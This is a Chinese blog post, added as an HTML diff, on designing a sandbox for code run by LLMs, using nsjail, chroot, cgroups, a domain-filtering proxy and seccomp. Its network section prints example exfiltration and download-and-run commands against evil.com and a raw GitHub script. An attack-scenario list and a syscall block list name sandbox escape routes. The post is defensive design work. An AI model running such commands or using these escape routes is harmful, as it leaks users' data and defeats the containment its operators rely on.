@@ -1,0 +1,1023 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>AI 系统的沙盒执行环境设计思路 | 徇的小站</title><meta name="author" content="codexvn"><meta name="copyright" content="codexvn"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="背景 在 AI 应用中，LLM 经常需要执行代码——运行 Shell 脚本、读写文件、安装依赖。但 LLM 的输出本质不可信：它可能幻觉出危险命令，也可能在 prompt injection 下被诱导执行恶意代码。 沙盒执行环境因此成为 AI 系统的基础设施。本文从架构设计的角度，拆解一套可落地的沙盒方案。 分层设计：传输与隔离解耦 沙盒有两个可以独立变化的关注点： 关注点一：传输方式——命令怎么">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AI 系统的沙盒执行环境设计思路">
+<meta property="og:url" content="https://codexvn.top/2026/AI%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF.html">
+<meta property="og:site_name" content="徇的小站">
+<meta property="og:description" content="背景 在 AI 应用中，LLM 经常需要执行代码——运行 Shell 脚本、读写文件、安装依赖。但 LLM 的输出本质不可信：它可能幻觉出危险命令，也可能在 prompt injection 下被诱导执行恶意代码。 沙盒执行环境因此成为 AI 系统的基础设施。本文从架构设计的角度，拆解一套可落地的沙盒方案。 分层设计：传输与隔离解耦 沙盒有两个可以独立变化的关注点： 关注点一：传输方式——命令怎么">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://codexvn.top/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-05-23T04:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-15T16:16:59.985Z">
+<meta property="article:author" content="codexvn">
+<meta property="article:tag" content="AI">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="架构设计">
+<meta property="article:tag" content="沙盒">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://codexvn.top/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "AI 系统的沙盒执行环境设计思路",
+  "url": "https://codexvn.top/2026/AI%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF.html",
+  "image": "https://codexvn.top/img/butterfly-icon.png",
+  "datePublished": "2026-05-23T04:00:00.000Z",
+  "dateModified": "2026-06-15T16:16:59.985Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "codexvn",
+      "url": "https://codexvn.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://codexvn.top/2026/AI%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%B2%99%E7%9B%92%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?3f15851ff792ebcd0274c52bbbb9524e";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);
+})();
+btf.addGlobalFn('pjaxComplete', () => {
+  _hmt.push(['_trackPageview',window.location.pathname])
+}, 'baidu_analytics')
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-1T1C5Y5F7W"></script><script>window.dataLayer = window.dataLayer || []
+function gtag(){dataLayer.push(arguments)}
+gtag('js', new Date())
+gtag('config', 'G-1T1C5Y5F7W')
+btf.addGlobalFn('pjaxComplete', () => {
+  gtag('config', 'G-1T1C5Y5F7W', {'page_path': window.location.pathname})
+}, 'google_analytics')
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'AI 系统的沙盒执行环境设计思路',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 8.1.2"></head><body><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">徇的小站</span></a><a class="nav-page-title" href="/"><span class="site-name">AI 系统的沙盒执行环境设计思路</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">AI 系统的沙盒执行环境设计思路</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-05-23T04:00:00.000Z" title="发表于 2026-05-23 12:00:00">2026-05-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-15T16:16:59.985Z" title="更新于 2026-06-16 00:16:59">2026-06-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/AI%E4%B8%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">AI与机器学习</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/AI%E4%B8%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%AE%89%E5%85%A8/">安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><h1>背景</h1>
+<p>在 AI 应用中，LLM 经常需要执行代码——运行 Shell 脚本、读写文件、安装依赖。但 LLM 的输出本质不可信：它可能幻觉出危险命令，也可能在 prompt injection 下被诱导执行恶意代码。</p>
+<p>沙盒执行环境因此成为 AI 系统的基础设施。本文从架构设计的角度，拆解一套可落地的沙盒方案。</p>
+<h1>分层设计：传输与隔离解耦</h1>
+<p>沙盒有两个可以独立变化的关注点：</p>
+<p><strong>关注点一：传输方式</strong>——命令怎么发到执行环境？</p>
+<ul>
+<li>开发调试时直接在本地起进程，延迟低</li>
+<li>生产环境通过 SSH 发到隔离容器，宿主机零风险</li>
+</ul>
+<p><strong>关注点二：隔离级别</strong>——用什么力度限制进程？</p>
+<ul>
+<li>轻量级：namespace + chroot + capability drop，适用于开发环境与内部信任任务</li>
+<li>严格级：轻量级基础上叠加 seccomp + cgroup（内存/CPU 限制）+ 独立 network namespace + 禁用 /proc，适用于不可信的外部输入</li>
+</ul>
+<p>关键是这两个关注点<strong>互不耦合</strong>——传输方式和隔离级别各写一份实现，按需组合使用，不用为每种&quot;传输+隔离&quot;的组合写一套独立的代码。</p>
+<pre><code class="highlight mermaid">flowchart LR
+    subgraph 传输实现
+        L[&quot;本地执行&lt;br/&gt;(ProcessBuilder)&quot;]
+        S[&quot;远程 SSH&lt;br/&gt;(SSH + SFTP)&quot;]
+    end
+    subgraph 隔离实现
+        A[&quot;轻量隔离&lt;br/&gt;(namespace + chroot&lt;br/&gt;+ capability drop)&quot;]
+        B[&quot;严格隔离&lt;br/&gt;(seccomp + cgroup&lt;br/&gt;+ 网络隔离)&quot;]
+    end
+    subgraph 按需组合
+        LL[&quot;本地轻量&lt;br/&gt;开发调试&quot;]
+        LS[&quot;远程轻量&lt;br/&gt;CI 环境&quot;]
+        SL[&quot;本地严格&lt;br/&gt;本地高安全&quot;]
+        SS[&quot;远程严格&lt;br/&gt;生产推荐&quot;]
+    end
+    L --&gt; A --&gt; LL
+    L --&gt; B --&gt; SL
+    S --&gt; A --&gt; LS
+    S --&gt; B --&gt; SS</code></pre>
+<h1>隔离模型：简单而高效的设计</h1>
+<p>核心思路：</p>
+<blockquote>
+<p><strong>给进程切换到隔离的文件系统视图——它只能看到沙盒内暴露的目录结构，无法直接访问宿主机其他路径。</strong></p>
+</blockquote>
+<p>需要注意的是：<code>chroot</code> 本身并不构成完整安全边界，真正的隔离依赖于 mount namespace、capability drop、seccomp、cgroup 等机制协同工作。</p>
+<h3 id="原理：mount-namespace-chroot-资源限制">原理：mount namespace + chroot + 资源限制</h3>
+<p>nsjail 利用 Linux mount namespace 为进程创建独立的文件系统视图，配合 chroot 将进程的根目录锁定在沙盒专属目录内。沙盒外的路径对进程不可见。</p>
+<p>搭建沙盒的步骤：</p>
+<pre><code class="highlight mermaid">flowchart TD
+    subgraph 准备[&quot;第1步：准备 chroot 目录树&quot;]
+        RO[&quot;宿主机 /sandbox/&#123;id&#125;/&quot;]
+        RO --&gt; USR[&quot;usr/ ← 只读 bind 自宿主机 /usr&quot;]
+        RO --&gt; LIB[&quot;lib/ ← 只读 bind 自宿主机 /lib&quot;]
+        RO --&gt; BIN[&quot;bin/ ← 只读 bind 自宿主机 /bin&quot;]
+        RO --&gt; ETC[&quot;etc/ ← 只读 bind 自宿主机 /etc&quot;]
+        RO --&gt; OPT[&quot;opt/ ← 只读 bind 自宿主机 /opt&quot;]
+        RO --&gt; WS[&quot;workspace/ ← 空目录，可写&quot;]
+        RO --&gt; HM[&quot;home/ ← 空目录，可写&quot;]
+        RO --&gt; TM[&quot;tmp/ ← 空目录，可写&quot;]
+    end
+    subgraph 运行[&quot;第2步：chroot + cgroup 启动&quot;]
+        CHROOT[&quot;nsjail --chroot /sandbox/&#123;id&#125;&quot;]
+        CG[&quot;--cgroup_mem_max 512MB&quot;]
+        CPU[&quot;--cgroup_cpu_ms_per_sec 800&quot;]
+        NP[&quot;--disable_proc （屏蔽 /proc）&quot;]
+        CAP[&quot;--cap-drop ALL （降权）&quot;]
+        NP2[&quot;no_new_privs 开启（nsjail 默认）&quot;]
+    end
+    准备 --&gt; 运行</code></pre>
+<p>chroot 后进程看到的文件系统：</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>进程视角</th>
+<th>实际情况</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/usr</code>, <code>/lib</code>, <code>/bin</code>, <code>/etc</code>, <code>/opt</code></td>
+<td>可读不可写</td>
+<td>宿主机目录 bind 进来，写保护</td>
+</tr>
+<tr>
+<td><code>/workspace</code></td>
+<td>可读可写</td>
+<td>沙盒目录内的普通目录，可自由读写</td>
+</tr>
+<tr>
+<td><code>/home/$USER</code></td>
+<td>可读可写</td>
+<td>同上，工具链依赖的 home 都在这里</td>
+</tr>
+<tr>
+<td><code>/tmp</code></td>
+<td>可读可写</td>
+<td>同上，会话结束整目录销毁</td>
+</tr>
+<tr>
+<td>沙盒外的任何路径</td>
+<td><strong>不可访问</strong></td>
+<td>mount namespace + chroot 限制文件系统视图，沙盒外路径不在可见范围内</td>
+</tr>
+</tbody>
+</table>
+<h3 id="为什么选择-chroot-namespace？">为什么选择 chroot + namespace？</h3>
+<p>相比纯&quot;overlay 虚拟挂载&quot;方案，<code>chroot + mount namespace</code> 有工程优势：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>overlay / 虚拟挂载方案</th>
+<th>chroot + namespace</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件系统视图</td>
+<td>overlayfs 叠加</td>
+<td>独立根目录</td>
+</tr>
+<tr>
+<td>系统目录控制</td>
+<td>需要额外挂载策略</td>
+<td>bind 只读目录即可</td>
+</tr>
+<tr>
+<td>符号链接行为</td>
+<td>需额外检查逃逸</td>
+<td>链接解析受根目录限制</td>
+</tr>
+<tr>
+<td>资源限制</td>
+<td>需单独配置 cgroup</td>
+<td>nsjail 内置支持</td>
+</tr>
+<tr>
+<td>启动成本</td>
+<td>低</td>
+<td>低</td>
+</tr>
+</tbody>
+</table>
+<p>需要强调的是：</p>
+<ul>
+<li><code>chroot</code> 本身不是完整安全边界</li>
+<li>真正的隔离来自 namespace + seccomp + capability drop + cgroup 的组合</li>
+<li>本方案定位是<strong>轻量高性能隔离</strong>，而非 VM 级强隔离</li>
+</ul>
+<h3 id="为什么需要独立的-Home-目录？">为什么需要独立的 Home 目录？</h3>
+<p>很多开发者工具（pip、npm、git 等）假设 <code>$HOME</code> 是可写的，会往 <code>~/.cache</code>、<code>~/.config</code>、<code>~/.local</code> 等路径写缓存和配置。如果 <code>$HOME</code> 不可写，这些工具会直接失败。因此沙盒必须提供一个独立的、可写的 home 目录。</p>
+<p>但初始化时不从宿主机复制任何 home 内容——不复制 <code>.config</code>、<code>.cache</code>、<code>.local</code>，更不碰 <code>.ssh</code>、<code>.gnupg</code>。沙盒内的 home 从一个空目录起步，工具链按需自行创建缓存和配置。</p>
+<h3 id="Home-目录初始化步骤">Home 目录初始化步骤</h3>
+<p>nsjail 的 home 初始化很简洁——namespace + chroot 构成的文件系统视图即沙盒的全部可见范围：</p>
+<pre><code class="highlight mermaid">sequenceDiagram
+    participant HOST as 宿主机
+    participant SANDBOX as 沙盒服务
+    participant JAIL as nsjail 沙盒
+
+    SANDBOX-&gt;&gt;HOST: mkdir -p /sandbox/&#123;id&#125;/&#123;home/.local/bin,workspace,tmp&#125;
+    SANDBOX-&gt;&gt;HOST: bind 系统目录到 chroot 树&lt;br/&gt;(/usr /lib /bin /etc /opt，只读)
+
+    Note over SANDBOX,HOST: 不复制宿主机任何 home 内容
+
+    Note over SANDBOX,JAIL: chroot + cgroup 启动
+    SANDBOX-&gt;&gt;JAIL: nsjail --chroot /sandbox/&#123;id&#125; --cgroup_mem_max 512M --cap-drop ALL --disable_proc
+    SANDBOX-&gt;&gt;JAIL: export HOME=/home/$USER TMPDIR=/tmp PATH=.../home/.local/bin</code></pre>
+<p>具体命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1. 创建 chroot 根目录结构</span><br><span class="line">   SANDBOX_ROOT=/sandbox/&#123;sessionId&#125;</span><br><span class="line">   mkdir -p $SANDBOX_ROOT/workspace</span><br><span class="line">   mkdir -p $SANDBOX_ROOT/home/.local/bin</span><br><span class="line">   mkdir -p $SANDBOX_ROOT/tmp</span><br><span class="line"></span><br><span class="line">2. bind 系统目录（只读，供沙盒内的程序使用基本工具）</span><br><span class="line">   mount --bind /usr  $SANDBOX_ROOT/usr  &amp;&amp; mount -o remount,ro $SANDBOX_ROOT/usr</span><br><span class="line">   mount --bind /lib  $SANDBOX_ROOT/lib  &amp;&amp; mount -o remount,ro $SANDBOX_ROOT/lib</span><br><span class="line">   mount --bind /bin  $SANDBOX_ROOT/bin  &amp;&amp; mount -o remount,ro $SANDBOX_ROOT/bin</span><br><span class="line">   mount --bind /etc  $SANDBOX_ROOT/etc  &amp;&amp; mount -o remount,ro $SANDBOX_ROOT/etc</span><br><span class="line">   mount --bind /opt  $SANDBOX_ROOT/opt  &amp;&amp; mount -o remount,ro $SANDBOX_ROOT/opt</span><br><span class="line"></span><br><span class="line">3. 启动 nsjail（no_new_privs 默认开启，无需显式传参）</span><br><span class="line">   nsjail --mode l \</span><br><span class="line">     --chroot $SANDBOX_ROOT \</span><br><span class="line">     --cgroup_mem_max 536870912 \</span><br><span class="line">     --cgroup_cpu_ms_per_sec 800 \</span><br><span class="line">     --disable_proc \</span><br><span class="line">     --cap-drop ALL \</span><br><span class="line">     --env HOME=/home/$USER \</span><br><span class="line">     --env TMPDIR=/tmp \</span><br><span class="line">     --env PATH=/usr/local/bin:/usr/bin:/bin:/home/$USER/.local/bin \</span><br><span class="line">     -- /bin/sh -c &#x27;用户的命令&#x27;</span><br></pre></td></tr></table></figure>
+<p>不复制宿主机 home 内容，原因在两方面：</p>
+<ul>
+<li><strong>安全</strong>：沙盒进程不应接触 <code>~/.ssh</code>、<code>~/.gnupg</code> 等敏感目录；也不应拿到 <code>.gitconfig</code> 中的个人信息，或 <code>.npmrc</code> 中的 registry token</li>
+<li><strong>隔离性</strong>：空 home 意味着沙盒内工具的行为完全可控、可复现，不受宿主机 home 历史状态的干扰</li>
+</ul>
+<h3 id="最终目录结构">最终目录结构</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/sandbox/&#123;sessionId&#125;/     ← chroot 的根</span><br><span class="line">├── usr/      ← 宿主机 /usr bind (只读)</span><br><span class="line">├── lib/      ← 宿主机 /lib bind (只读)</span><br><span class="line">├── bin/      ← 宿主机 /bin bind (只读)</span><br><span class="line">├── etc/      ← 宿主机 /etc bind (只读)</span><br><span class="line">├── opt/      ← 宿主机 /opt bind (只读)</span><br><span class="line">├── workspace/   # 主工作区——LLM 读写的文件都在这里</span><br><span class="line">├── home/        # 用户家目录——空目录起步</span><br><span class="line">│   └── .local/bin/  # pip install --user 的安装目标</span><br><span class="line">└── tmp/         # 临时目录</span><br></pre></td></tr></table></figure>
+<p>整个目录树在宿主机上就是 <code>/sandbox/{sessionId}/</code>，chroot 后进程把它当 <code>/</code> 看。</p>
+<p><strong>释放沙盒时需要注意顺序</strong>：必须先 <code>umount</code> 解绑所有 bind 挂载点，再 <code>rm -rf</code> 删除目录。如果反过来，<code>rm -rf</code> 会穿透 bind 挂载删到宿主机文件——<code>rm -rf /sandbox/{id}/usr</code> 删的可是真实的 <code>/usr</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放：先 umount，再 rm</span><br><span class="line">umount -f $SANDBOX_ROOT/usr</span><br><span class="line">umount -f $SANDBOX_ROOT/lib</span><br><span class="line">umount -f $SANDBOX_ROOT/bin</span><br><span class="line">umount -f $SANDBOX_ROOT/etc</span><br><span class="line">umount -f $SANDBOX_ROOT/opt</span><br><span class="line">rm -rf $SANDBOX_ROOT</span><br></pre></td></tr></table></figure>
+<h3 id="攻击场景验证">攻击场景验证</h3>
+<ul>
+<li><code>rm -rf /</code>？ → mount namespace + chroot 限制在沙盒视图内，宿主机文件不受影响</li>
+<li><code>cat /etc/passwd</code>？ → 可读沙盒内 bind 的只读副本，无法修改</li>
+<li><code>ps aux</code> 枚举进程？ → <code>--disable_proc</code> 后 <code>/proc</code> 不存在，无法获取宿主机进程信息</li>
+<li><code>pip install --user malicious-pkg</code>？ → 装进沙盒 home，会话结束 rm -rf 清理</li>
+<li>死循环 / 内存泄漏？ → cgroup 限制内存超 512MB OOM kill，CPU 受限</li>
+<li>setuid 提权？ → <code>--cap-drop ALL</code> + <code>no_new_privs</code> 禁止</li>
+</ul>
+<p>nsjail 方案的核心价值：<strong>namespace + chroot + seccomp + capability drop + cgroup 的组合，提供轻量级但够用的工程安全边界。</strong></p>
+<h1>超越文件系统：网络控制与纵深防御</h1>
+<p>chroot 搞定了文件隔离，但一个可用的沙盒远不止这些。实际落地时还有几个问题：网络、系统调用、强制拒绝路径。</p>
+<h3 id="网络：三层代理架构">网络：三层代理架构</h3>
+<p>nsjail 会运行在独立的 network namespace 中。默认情况下不允许直接访问宿主机网络——但 LLM 执行的操作经常需要联网（<code>pip install</code>、<code>git clone</code>、<code>curl</code> 都要出站），因此需要代理桥接。</p>
+<p>实用方案是 <strong>三层架构</strong>：</p>
+<pre><code class="highlight mermaid">flowchart LR
+    subgraph NS[&quot;独立 Network Namespace&quot;]
+        PROC[&quot;沙盒进程&lt;br/&gt;(curl/pip/git)&quot;]
+        SCT_IN[&quot;socat 客户端&lt;br/&gt;TCP:3128 / TCP:1080&quot;]
+    end
+    subgraph HOST[&quot;宿主机&quot;]
+        SCT_OUT[&quot;socat 宿主机端&lt;br/&gt;Unix Socket&quot;]
+        HTTP[&quot;HTTP 代理&lt;br/&gt;127.0.0.1:3128&lt;br/&gt;域名白名单&quot;]
+        SOCKS[&quot;SOCKS5 代理&lt;br/&gt;127.0.0.1:1080&lt;br/&gt;域名白名单&quot;]
+    end
+    OUT[&quot;外网&lt;br/&gt;pypi.org / npmjs.org&quot;]
+    PROC --&gt;|&quot;HTTP_PROXY=127.0.0.1:3128&quot;| SCT_IN
+    SCT_IN --&gt;|&quot;Unix Socket 桥接&quot;| SCT_OUT
+    SCT_OUT --&gt; HTTP
+    SCT_OUT --&gt; SOCKS
+    HTTP --&gt;|&quot;域名过滤通过&quot;| OUT
+    SOCKS --&gt;|&quot;域名过滤通过&quot;| OUT</code></pre>
+<p><strong>第一层 — 宿主机代理</strong>：在宿主机侧启动两个代理进程：</p>
+<ul>
+<li>HTTP 代理（监听 <code>127.0.0.1:3128</code>）：处理 HTTP/HTTPS 流量，对 CONNECT 隧道的目标域名做白名单校验</li>
+<li>SOCKS5 代理（监听 <code>127.0.0.1:1080</code>）：处理非 HTTP 的 TCP 流量（SSH、数据库、gRPC）</li>
+</ul>
+<p>两个代理共享同一份域名过滤规则，默认策略是 <strong>fail-closed</strong>：域名不在白名单里就拒绝连接。</p>
+<p><strong>为什么需要域名过滤？</strong> 假设不控制网络出站，LLM 可以做几件很危险的事：</p>
+<ul>
+<li><strong>数据外传</strong>：<code>curl -X POST https://evil.com/collect -d @/workspace/secrets.json</code>，把沙盒里的敏感数据 POST 到外部服务器</li>
+<li><strong>下载即执行</strong>：<code>curl https://raw.githubusercontent.com/evil/script.sh | bash</code>，从代码托管平台拉未经审核的脚本直接执行</li>
+<li><strong>C2 回连</strong>：被 prompt injection 注入的恶意命令回连攻击者的 C2 服务器，变成一个驻留的 bot</li>
+</ul>
+<p>因此需要白名单 + denylist 双重过滤：denylist 优先于 allowlist——比如允许 <code>*.github.com</code> 但拒绝 <code>raw.githubusercontent.com</code>，防止下载未经审核的脚本直接执行。</p>
+<p><strong>第二层 — socat 桥接</strong>：宿主机代理在 <code>127.0.0.1</code> 上监听，但沙盒进程在独立 network namespace 中看不到宿主机回环地址。需要 socat 桥接：宿主机起两个 socat 监听 Unix socket，沙盒内部再起两个 socat 监听 TCP 端口并通过 Unix socket 转发到宿主机。对沙盒内的进程来说，访问 <code>127.0.0.1:3128</code> 就是走代理，无需感知 Unix socket 的存在。</p>
+<p><strong>第三层 — 环境变量注入</strong>：启动沙盒进程时注入代理环境变量，让所有生态工具自动走代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export HTTP_PROXY=http://127.0.0.1:3128</span><br><span class="line">export HTTPS_PROXY=http://127.0.0.1:3128</span><br><span class="line">export ALL_PROXY=socks5://127.0.0.1:1080</span><br><span class="line">export NO_PROXY=localhost,127.0.0.1,10.0.0.0/8,172.16.0.0/12,192.168.0.0/16</span><br></pre></td></tr></table></figure>
+<p><code>NO_PROXY</code> 排除内网地址段，防止内部 API 调用被代理拦截。</p>
+<h3 id="Seccomp：系统调用过滤">Seccomp：系统调用过滤</h3>
+<p>文件系统和网络隔离之外，还需要限制系统调用攻击面。现代 Linux 内核中，一些新 syscall（如 <code>io_uring</code>）可能绕过传统的 socket 过滤。</p>
+<p>实践中更推荐<strong>默认 deny + 按需 allowlist</strong>：</p>
+<ul>
+<li>先阻止所有非必要 syscall</li>
+<li>只放行经过验证的安全 syscall 集合</li>
+<li>随着内核更新持续审计新增 syscall</li>
+</ul>
+<p>重点限制的高风险 syscall 包括：</p>
+<ul>
+<li><code>socket(AF_UNIX, ...)</code> — 防止在沙盒内创建 Unix socket 绕过网络过滤</li>
+<li><code>io_uring_setup</code> / <code>io_uring_enter</code> / <code>io_uring_register</code> — 堵住 io_uring 旁路</li>
+<li><code>bpf</code> — 防止加载任意 BPF 程序</li>
+<li><code>userfaultfd</code> — 防止用户态缺页处理逃逸</li>
+<li><code>perf_event_open</code> — 防止性能事件侧信道</li>
+</ul>
+<p>seccomp 过滤器编译为 BPF 字节码，通过一个独立的小型 C 程序注入。注入时机必须在 socat 启动<strong>之后</strong>、用户命令执行<strong>之前</strong>——因为 socat 本身需要创建 Unix socket 来桥接网络。注入后启动嵌套 PID namespace，使沙盒进程无法通过 <code>/proc/N/mem</code> 读写未过滤进程的内存。</p>
+<h3 id="Capability-与-no-new-privs">Capability 与 no_new_privs</h3>
+<p>Linux capability 是现代沙盒的重要组成部分。即使进程运行在隔离文件系统中，如果仍保留 <code>CAP_SYS_ADMIN</code>、<code>CAP_SYS_PTRACE</code>、<code>CAP_NET_ADMIN</code> 等高权限 capability，依然可能影响宿主机。</p>
+<p>因此实际运行时应：</p>
+<ul>
+<li>drop 所有非必要 capability</li>
+<li>开启 <code>no_new_privs</code>，禁止 setuid 二进制提权</li>
+<li>禁止 <code>CAP_SYS_PTRACE</code>（防止 ptrace 逃逸）</li>
+</ul>
